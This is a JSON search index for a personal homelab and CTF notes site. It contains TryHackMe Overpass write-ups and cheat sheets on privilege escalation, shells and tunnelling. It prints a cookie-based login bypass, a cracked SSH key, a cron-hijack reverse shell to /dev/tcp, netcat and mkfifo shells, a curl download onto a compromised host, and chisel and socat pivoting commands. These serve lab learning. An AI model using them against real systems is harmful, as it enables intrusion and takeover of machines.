[
{
	"uri": "/networking/",
	"title": "Networking",
	"tags": [],
	"description": "",
	"content": "Networking "
},
{
	"uri": "/hacking/notes/",
	"title": "Notes",
	"tags": [],
	"description": "",
	"content": "Notes Privesc\rShells\rTunnelling\r"
},
{
	"uri": "/servers/",
	"title": "Servers",
	"tags": [],
	"description": "",
	"content": "Servers "
},
{
	"uri": "/hacking/",
	"title": "Hacking",
	"tags": [],
	"description": "",
	"content": "Hacking Notes\rPrivesc\rShells\rTunnelling\rTryHackMe\rOverpass\rOverpass 2\r"
},
{
	"uri": "/hardware/",
	"title": "Hardware",
	"tags": [],
	"description": "",
	"content": "Hardware "
},
{
	"uri": "/hacking/tryhackme/",
	"title": "TryHackMe",
	"tags": [],
	"description": "",
	"content": "TryHackMe Walkthroughs "
},
{
	"uri": "/",
	"title": "About",
	"tags": [],
	"description": "",
	"content": "Notes and Stuff Hi my name is Mitch and this is a site I set up to document the things I have learned setting up my homelab, going through CTFs and working on hardware level projects. It is mainly a place I can write down my thoughts and notes while I learn.\nNetworking homelab network documentation note on networking related certifications Servers documenting the setup and issues that come up with the servers in my homelab Hacking CTF writeups notes on some tips and techniques I have picked up Hardware learning about reverse engineering/hardware hacking learning about beginner electronics subjects "
},
{
	"uri": "/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/hacking/tryhackme/overpass/",
	"title": "Overpass",
	"tags": [],
	"description": "",
	"content": "Enumeration Nmap Scan\n└─$ nmap -sC -sV 10.10.164.133 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 19:58 EST Nmap scan report for 10.10.164.133 Host is up (0.20s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37968598d1009c1463d9b03475b1f957 (RSA) | 256 5375fac065daddb1e8dd40b8f6823924 (ECDSA) |_ 256 1c4ada1f36546da6c61700272e67759c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.03 seconds Gobuster scan\n└─$ nmap -sC -sV 10.10.164.133 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 19:58 EST Nmap scan report for 10.10.164.133 Host is up (0.20s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37968598d1009c1463d9b03475b1f957 (RSA) | 256 5375fac065daddb1e8dd40b8f6823924 (ECDSA) |_ 256 1c4ada1f36546da6c61700272e67759c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.03 seconds Admin page \u0026amp; ssh After finding the admin page using gobuster I went to it in a browser, got to the login screen and tried some typical default credentials with no luck, time to look at the source code.\nThis brought me to the login.js script and this section of code stood out to me.\nasync function login() { const usernameBox = document.querySelector(\u0026#34;#username\u0026#34;); const passwordBox = document.querySelector(\u0026#34;#password\u0026#34;); const loginStatus = document.querySelector(\u0026#34;#loginStatus\u0026#34;); loginStatus.textContent = \u0026#34;\u0026#34; const creds = { username: usernameBox.value, password: passwordBox.value } const response = await postData(\u0026#34;/api/login\u0026#34;, creds) const statusOrCookie = await response.text() if (statusOrCookie === \u0026#34;Incorrect credentials\u0026#34;) { loginStatus.textContent = \u0026#34;Incorrect Credentials\u0026#34; passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/admin\u0026#34; } } Set a cookie called \u0026ldquo;SessionToken\u0026rdquo; with a value of \u0026ldquo;correctcredentials\u0026rdquo; \u0026hellip; and success, we get an ssh key.\n-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337 LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal 73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR 3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P 9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ 4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8 GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk 6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58 dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT 8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K 4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS 49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2 +hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7 -----END RSA PRIVATE KEY----- chmod 600 on the key and ssh in \u0026hellip; need a password. Run ssh2john to get a hash\nid_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b use hashcat and get james13 as the password\nDictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 $sshng$1$16$9f85d92f34f42626f13a7493ab48f337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b:james13 Session..........: hashcat Status...........: Cracked Hash.Mode........: 22931 (RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)) Hash.Target......: $sshng$1$16$9f85d92f34f42626f13a7493ab48f337$1200$2...bfc53b Time.Started.....: Wed Mar 1 20:14:13 2023 (0 secs) Time.Estimated...: Wed Mar 1 20:14:13 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 458.5 kH/s (0.15ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 13568/14344385 (0.09%) Rejected.........: 0/13568 (0.00%) Restore.Point....: 13312/14344385 (0.09%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: 120806 -\u0026gt; sugar123 Hardware.Mon.#1..: Util: 99% Started: Wed Mar 1 20:13:11 2023 Stopped: Wed Mar 1 20:14:15 2023 └─$ ssh -i id_rsa james@10.10.15.117 The authenticity of host \u0026#39;10.10.15.117 (10.10.15.117)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:16: [hashed name] ~/.ssh/known_hosts:18: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.15.117\u0026#39; (ED25519) to the list of known hosts. Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information disabled due to load higher than 1.0 47 packages can be updated. 0 updates are security updates. Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1 james@overpass-prod:~$ ls todo.txt user.txt Privesc Find something interesting when looking at the /etc/crontab file\njames@overpass-prod:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # Update builds from latest code * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash In the hosts file I change overpass.thm to point to my attacking machine\u0026rsquo;s IP and use python to put up a webserver to host a reverse shell in buildscript.sh. I then set up a netcat listener.\n└─$ cat buildscript.sh #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.2.22.84/4242 0\u0026gt;\u0026amp;1 Success!\n└─$ nc -lvnp 4242 listening on [any] 4242 ... connect to [10.2.22.84] from (UNKNOWN) [10.10.15.117] 60460 bash: cannot set terminal process group (1205): Inappropriate ioctl for device bash: no job control in this shell root@overpass-prod:~# ls ls buildStatus builds go root.txt src "
},
{
	"uri": "/hacking/tryhackme/overpass2/overpass_2/",
	"title": "Overpass 2",
	"tags": [],
	"description": "",
	"content": "For this room you start off by analyzing a pcap file.\nPcap file Just from looking at the start of the capture we can see that a file was uploaded to the /Development/ page and if you follow the tcp stream you see what code was uploaded\nCode uploaded To look at what the attacker was doing on the machine I applied a filter to show the packets with a source port 4242 using \u0026ldquo;tcp.port==4242\u0026rdquo;. We can also see James\u0026rsquo; password and what the attacker used for persistence, https://github.com/NinjaJc01/ssh-backdoor.\nAttackers Reverse shell From here I went to the github repository for the ssh-backdoor in order to find the default hash and hardcoded salt used. To find the hash the attacker used, go back to the previous tcp stream and look for where the ./backdoor command was ran. With this we can crack the hash to find out the password.\n"
},
{
	"uri": "/hacking/notes/privesc/",
	"title": "Privesc",
	"tags": [],
	"description": "",
	"content": "SUDO\nuse \u0026ldquo;sudo -l\u0026rdquo; to see what the user can use sudo on and use gtfo bins SUID\nfind / -type f -perm -04000 -ls 2\u0026gt;/dev/null - finds suid files on machine use gtfo bins to abuse this Capabilities\nusing \u0026ldquo;getcap -r / 2\u0026gt;/dev/null\u0026rdquo; you can list binaries that can use higher privileges then use gtfo bins Cronjobs\nlook in the /etc/crontab file and look at what jobs are running if there is no full path you can create a script in one of the path locations create a rev shell script or exploit one of the binaries used in a script. make sure that the script is executable PATH\nuse \u0026ldquo;find / -writable 2\u0026gt;/dev/null\u0026rdquo; to find writable directories add to \u0026ldquo;PATH variable with export PATH=/:$PATH\u0026rdquo; NFS\nNFS config: /etc/exports look for the share that has no_root-squash this keeps it operating with root privileges on attacking machine: showmount -e mount -o rw :/ / create an executable that will run /bin/bash on the target set SUID bits so it will run as root run script on target machine "
},
{
	"uri": "/hacking/notes/shells/",
	"title": "Shells",
	"tags": [],
	"description": "",
	"content": "Netcat on compromised machine nc -lvnp PORT -e /bin/bash If previous doesn\u0026rsquo;t work use: mkfifo /tmp/f; nc -lvnp \u0026lt; /tmp/f | /bin/sh \u0026gt;/tmp/f 2\u0026gt;\u0026amp;1; rm /tmp/ Stabalize a reverse shell python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;; export TERM=xterm Ctrl Z + stty raw -echo; fg "
},
{
	"uri": "/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/hacking/notes/tunnelling/",
	"title": "Tunnelling",
	"tags": [],
	"description": "",
	"content": "Chisel use webserver method to transfer files or use scp scp -i Key chisel user@target:/tmp/chisel has two modes server and client reverse SOCKS proxy\nset up listener on attacking box ./chisel server -p listenPort \u0026ndash;reverse \u0026amp; on the compromised host ./chisel client attackingIP:listenPort R:socks \u0026amp; port for sending data back through the proxy will be different forward SOCKS proxy\non compromised host ./chisel server -p listenPort \u0026ndash;socks5 on attacking box ./chisel client targerIP:listenPort proxyPort:socks make sure to set the port in the proxychains config and change the start of the line form socks4 to socks5 as chisel uses socks5 remote port forward\non our attacking machine ./chisel server -p listenPort \u0026ndash;reverse \u0026amp; on the compromised host ./chisel client attackingIP:listenPort R:localPort:targetIP:targetPort \u0026amp; listenPort - port for the chisel server localPort - port we wish to open on the attacking machine to link with the desired target port local port forward\non compromised machine\n./chisel server -p listenPort on attacking machine\n./chisel client listenIP:listenPort localPort:targetIP:targetPort to destroy the connections use\njobs - list background jobs kill %number Socat Upload the Socat binary to the compromised box\nsudo python3 -m http.server 80 On target: curl attackingIP/socat -o /tmp/socat \u0026amp;\u0026amp; chmod +x /tmp/socat set up netcat on attacking machine Start a relay from compromised server to attacking machine: ./socat tcp-l:listeningPort tcp:attackingIP:Port \u0026amp; \u0026amp; to background the socat process Port Forwarding\n./socat tcp-l:listeningport,fork,reuseaddr tcp:targetIP:Port \u0026amp; fork - put every connection into a new process reuseaddr - the port stays open after a connection is made to it Stable Linux Reverse Shell\non listening machine: socat TCP-L: FILE:tty,raw,echo=0 on connecting machine: socat TCP:: EXEC:\u0026ldquo;bash -li\u0026rdquo;,pty,stderr,sigint,setsid,sane SSH Forward Connections\nPort Forwarding ssh -L LocalPort:TargetIP user@AccessedMachineIP -fN -f(backgrounds the shell)N(no need to execute any commands) access target machine through accessed machine Proxies ssh -D LocalPort user@TargetIP -fN useful when combined with proxychains opens port on attacking machine and sends traffic through into the protected network Reverse Connections Create ssh keys and make sure the key can only be used for port forwarding. ssh -R LocalPort:TargetIP:TargetPort Username@AttackingIP -i Keyfile -fN sshuttle installed with sudo apt install sshuttle on attacking machine to connect with a server sshuttle -r username@address subnet ex: sshuttle -r user@172.16.0.5 172.16.0.0/24 can use -N to try and automatically determine the subnet can also use \u0026amp; to background the commands when you dont have the password or it requires key-based auth \u0026ndash;ssh-cmd ex: sshuttle -r user@address \u0026ndash;ssh-cmd \u0026ldquo;ssh -i KEYFILE\u0026rdquo; subnet when the compromised server is in the same subnet you are trying to forward to use: -x - tells sshuttle toi exclude the compromised server from the subnet range ex: sshuttle -r user@address subnet -x excludedIP "
}]